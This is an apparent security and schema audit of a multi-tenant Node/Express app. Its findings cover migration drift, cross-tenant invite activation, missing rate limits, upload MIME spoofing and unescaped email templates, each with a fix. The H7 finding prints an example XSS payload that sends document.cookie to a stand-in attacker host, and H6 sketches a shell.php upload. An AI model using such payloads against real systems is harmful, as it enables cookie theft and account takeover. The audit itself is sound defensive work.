**Three headline findings:**

1. **TWO parallel `migrations/` folders exist.** `migrations/` (10 files: 004, 005, 029-036) and `db/migrations/` (40 files: 001-029 + SAFE/MC variants). It is unclear which is canonical or what was actually run on production. This explains many of the schema-vs-code drift issues.

2. **`routes/materials.js` queries tables (`materials_requests` plural, `materials_tickets`) that are NOT created by any migration in either folder.** Either these tables were created manually on prod, or the entire materials route file has been silently broken. ## 🔴 CRITICAL Findings

### C1 — Two parallel migration folders, unclear canonical state
**Location:** `migrations/` (root) AND `db/migrations/`
**What's wrong:** The repository has two completely separate migration folders. The newer `migrations/` (10 files, mostly recent) and the older `db/migrations/` (40 files, comprehensive). It is not clear which folder was applied to production or whether both were applied in some order.
**Risk:** Any future migration is gambling on the wrong baseline. Schema drift is essentially guaranteed.
**Next step:** Decide on ONE canonical location. Move all migration files into `migrations/`. Document the actual order they were applied to production. Most likely truth: `db/migrations/` was the original, `migrations/` is recent additions made by Claude — they were never consolidated.

### C2 — `routes/materials.js` references tables that don't exist in any migration
**Location:** `routes/materials.js` lines 213, 233, 300, 350, 391, 415, 420, 477, 541, 582, 615, 628, 631, 753, 799
**What's wrong:** The route queries `public.materials_requests` (plural), `public.materials_tickets`, `public.materials_ticket_items`, `public.materials_request_items` — none of which are created by any migration in either folder.
**Risk:** Either (a) these tables were created manually in production (no version control, brittle), or (b) every endpoint in `routes/materials.js` returns 500 errors and the materials feature is silently broken.
**Next step:** Run the verification SQL at the bottom (V1) to determine which is true.

### C3 — Cross-tenant invite-token activation
**Location:** `routes/activate.js` lines 24-87 (GET `/activate`) and 92-182 (POST `/activate/set-pin`); also `routes/onboarding.js` line 49
**What's wrong:** The activation endpoints look up an invite by `token_hash` only — no check that the activator is authorized in the target company. A leaked or guessed invite token URL allows anyone to activate an account in any company.
**Risk:** Cross-tenant account creation. An attacker with a Company A invite link can register and gain access to Company A's data, even if they intended only to register in Company B. This breaks tenant isolation at the registration boundary.
**Next step:** Tighten activation to require the activator to either be unauthenticated OR belong to the company being activated. Add IP rate limit on the activation endpoint.

### C4 — `/api/auth/refresh` not rate-limited
**Location:** `index.js:40-41` (rate limiters); `routes/auth.js:142-217` (refresh endpoint)
**What's wrong:** Refresh-token rotation has no rate limit. Login and signup are limited (20 per 15 min), refresh is unlimited.
**Risk:** Distributed brute-force against refresh-token hashes. SHA-256 over a 64-byte random secret is strong, but unlimited attempts at internet scale narrow the window.
**Next step:** Add rate limiter to `/api/auth/refresh` (suggested: 60/15min per IP, lower per user_id once decoded).

### C5 — `/api/auth/change-pin` not rate-limited
**Location:** `routes/auth.js:305-340`
**What's wrong:** A user with a valid token can hammer change-pin endlessly. If a token is leaked, the attacker can also lock the legitimate user out by force-changing the PIN.
**Risk:** Account takeover via stolen-token + forced PIN reset.
**Next step:** Add rate limiter (suggested: 10/15min per user_id).

### C6 — `/api/onboarding/complete` not rate-limited
**Location:** `routes/onboarding.js:69-211`
**What's wrong:** Public endpoint (no auth) accepts a token + PIN setup. No rate limit. A weak invite token is brute-forceable.
**Risk:** Mass account-creation spam, race-condition registration, brute-force of invite tokens.
**Next step:** Add rate limiter to all public `/api/onboarding/*` endpoints (suggested: 30/15min per IP).

### C7 — Parameter index bug in `routes/onboarding.js`
**Location:** `routes/onboarding.js:156-159`
**What's wrong:** PostGIS UPDATE constructed with `params.length - 1` and `params.length`, evaluated at construction time. If subsequent code adds more params, the indices reference the wrong values, causing silent data corruption rather than a hard error.
**Risk:** Wrong values written to wrong columns; could corrupt employee records during signup.
**Next step:** Refactor to either explicit positional params or a build-time array of (column, value) pairs.

## 🟠 HIGH Findings

### H1 — `materials_requests` vs `material_requests` table name confusion
**Location:** `routes/materials.js` (uses plural) vs `routes/material_requests.js` (uses singular). Migration files only define singular.
**What's wrong:** Two route files mounted at the same path (`/api/materials`), each using a differently-named table for the same domain.
**Risk:** One of them is silently broken in production. The other works. Customers may be hitting whichever one has the inconsistency.
**Next step:** Run V1 (live-DB table list). Decide canonical name. Migrate the broken side.

### H2 — `material_requests.foreman_employee_id` referenced but never created
**Location:** `routes/material_requests.js:90, 439, 460, 475`; `routes/standup.js:257`
**What's wrong:** Code reads/writes `foreman_employee_id` column on `material_requests`. No migration creates it.
**Risk:** INSERT/SELECT errors at runtime. Either the column was added manually or the feature is broken.
**Next step:** Verify with V1 + V2. If missing, create migration to add. If present, document where it came from.

### H3 — `project_foremen.foreman_employee_id` (code) vs `project_foremen.employee_id` (migration)
**Location:** `routes/materials.js:106, 118, 148, 155`; `routes/material_requests.js:75, 86, 90, 439, 460, 475`
**What's wrong:** Code uses `foreman_employee_id` consistently. Migration `db/migrations/005_project_foremen.sql` defines it as `employee_id`.
**Risk:** Either column was renamed in production manually, or queries are broken.
**Next step:** Verify with V1.

### H4 — `project_foremen.is_active` referenced but never created
**Location:** `routes/materials.js:107, 119`
**What's wrong:** Code filters by `is_active` on `project_foremen`. No migration creates the column.
**Next step:** Verify with V1. Add column if needed.

### H5 — `attendance_logs` referenced but actual table is `attendance_records`
**Location:** `routes/materials.js:90-95`
**What's wrong:** Code queries `attendance_logs`. Actual table is `attendance_records` (per migration 027).
**Next step:** Verify with V1. Likely a stale rename that was missed.

### H6 — File-upload MIME validation via client header only
**Location:** `routes/hub.js:40-44`
**What's wrong:** `multer` accepts files based on `file.mimetype` (sent by the client). Original extension is preserved in the filename.
**Risk:** Attacker uploads `shell.php` with `mimetype: application/pdf`. If Nginx ever serves `/uploads/hub/` with PHP execution enabled, it's RCE.
**Next step:** Validate by reading the first bytes of the file (magic numbers) using `file-type` package. Force a known-safe extension (`.bin` or based on detected magic).

### H7 — XSS in email templates (sendAdminWelcome)
**Location:** `lib/email.js:81-122`
**What's wrong:** `companyName`, `username`, `tempPin` injected directly into HTML without escaping. `<h2>Welcome, ${companyName} Admin</h2>`.
**Risk:** A SUPER_ADMIN sets `companyName = '<img src=x onerror=fetch("https://attacker/?c="+document.cookie)>'`. Recipient opens the email; if their client renders HTML+JS (Outlook, Apple Mail with images allowed), the payload executes.
**Next step:** HTML-escape every user-controlled value in email templates. Use a small `escapeHtml()` helper (already exists in `routes/activate.js`).

### H8 — XSS in email templates (sendAssignmentEmployee, sendAssignmentForeman)
**Location:** `lib/email.js:127-241`
**What's wrong:** Same issue: `employeeName`, `projectName`, `siteAddress`, `foremanName`, `notes`, team list — all injected raw.
**Next step:** Same fix.

### H9 — XSS in email templates (sendPurchaseOrder)
**Location:** `lib/email.js:257-408`
**What's wrong:** Supplier name, project name, item names, notes — all injected raw.
**Next step:** Same fix.

### H10 — No JSON body / array-length limits on batch endpoints
**Location:** `index.js:30` (no explicit `limit` on `express.json()`); `routes/hub.js:159` (`recipient_ids` parsed from JSON)
**What's wrong:** Express defaults to 100KB body, but no per-route validation of array length. An attacker sends 10 000 recipient IDs to `/api/hub/messages`. The handler iterates and inserts a `task_recipient` row for each.
**Risk:** Single request → thousands of DB inserts → DoS via DB load and disk usage.
**Next step:** Add per-route input validators (e.g. `recipient_ids.length <= 100`).

### H11 — `home_lat`/`home_lng` duplicated across `employees` and `employee_profiles`, only one is live
**Location:** `db/migrations/004_geo_g0_employee_home_and_company_policy.sql` (adds to `employees`); `migrations/036_*` (populates `employee_profiles`)
**What's wrong:** Both tables have these columns. ALL code reads/writes the `employee_profiles` version. The `employees` version is dead but still defined and never enforced as `null` only.
**Risk:** Bugs from confusion. New developers will guess wrong. If anyone ever writes to `employees.home_lat`, it diverges silently.
**Next step:** Drop the columns from `employees` in a future migration (after confirming nobody writes to them via direct SQL or admin tools).

## 🟡 MEDIUM Findings

### M1 — `contact_email` duplicated in `employees` and `employee_profiles`, NOT synced
**Location:** `routes/invite_employee.js:172-175` (writes employees only); `routes/assignments.js:36, 53, 94`, `routes/attendance.js:64, 71`, `routes/auto_assign.js:334` (read from employee_profiles)
**What's wrong:** `contact_email` writes go to `employees`, reads happen from `employee_profiles`. They are populated separately with no sync trigger.
**Risk:** Foreman emails for assignments use a stale or empty value because the write-time value is never propagated.
**Next step:** Pick one canonical column. Add a sync trigger or update both writes.

### M2 — `role_code` duplicated across `app_users.role` and `employee_profiles.role_code`, NOT synced
**Location:** `migrations/033` (backfill); `routes/employees.js:349-353` (only updates `app_users`)
**What's wrong:** Initial backfill copied `app_users.role` → `employee_profiles.role_code`. Subsequent role changes update only `app_users.role`. The profiles copy goes stale.
**Risk:** Workforce planner / suggestions / assignment-role logic uses the stale `role_code`.
**Next step:** Pick canonical (`app_users.role` is the auth source of truth). Either keep `employee_profiles.role_code` in sync via a trigger, or remove it and join to `app_users` everywhere it's read.

### M3 — Three forms of coordinate storage in `employee_profiles`
**Location:** `migration 036`
**What's wrong:** `home_lat`, `home_lng`, `home_location` (PostGIS) all in same table. Migration 036 explicitly mirrors lat/lng → home_location, but writes from the application code don't always do this.
**Risk:** If `home_lat`/`home_lng` are updated without the geometry column, distance queries return wrong distance.
**Next step:** Add a database trigger that auto-updates `home_location` whenever `home_lat`/`home_lng` change. Or remove the lat/lng columns and use only PostGIS.

### M4 — Email/username identity split across 3 columns
**Location:** `app_users.username`, `employees.email`, `employees.contact_email`, `employee_profiles.contact_email`
**What's wrong:** Multiple "email-like" columns with different semantics, no single source of truth.
**Risk:** When a customer asks "update my employee's email", it's not clear what to update.
**Next step:** Document the intended semantics (login id vs notifications vs contact) and consolidate where possible.

### M5 — Phone duplicated across `employees.phone` and `employee_profiles.phone`
**Location:** Same pattern as H11 / M1
**What's wrong:** `employees.phone` is dead. Routes only read/write `employee_profiles.phone`.
**Next step:** Drop `employees.phone` after confirmation.

### M6 — Full name stored as TEXT in two places, computed-but-stored
**Location:** `employees.first_name + last_name` vs `employee_profiles.full_name`
**What's wrong:** `full_name` is a denormalized concatenation, never refreshed when `first_name`/`last_name` change.
**Next step:** Either drop `full_name` (compute at read time) or add a trigger.

### M7 — No rate limit on SUPER_ADMIN endpoints
**Location:** `index.js:95-96`
**What's wrong:** Mass company creation / mass plan changes possible from a stolen SUPER_ADMIN token.
**Next step:** Add a moderate rate limit (e.g. 100/hour) to mutation endpoints under `/api/super`.

### M8 — Weak CSP — `'unsafe-inline'` for scripts
**Location:** `index.js:14-27`
**What's wrong:** `scriptSrc` includes `'unsafe-inline'`. Any successful XSS injection becomes executable.
**Next step:** Replace with nonce-based CSP. Vite supports CSP nonces in production builds.

### M9 — Activation flow race condition (no row-level lock in onboarding.js)
**Location:** `routes/activate.js:111` (uses `FOR UPDATE`) vs `routes/onboarding.js:83` (does not)
**What's wrong:** Two concurrent requests for the same invite token can both pass the "not yet used" check before either sets `used_at`.
**Next step:** Add `FOR UPDATE` to the invite query in `onboarding.js`.
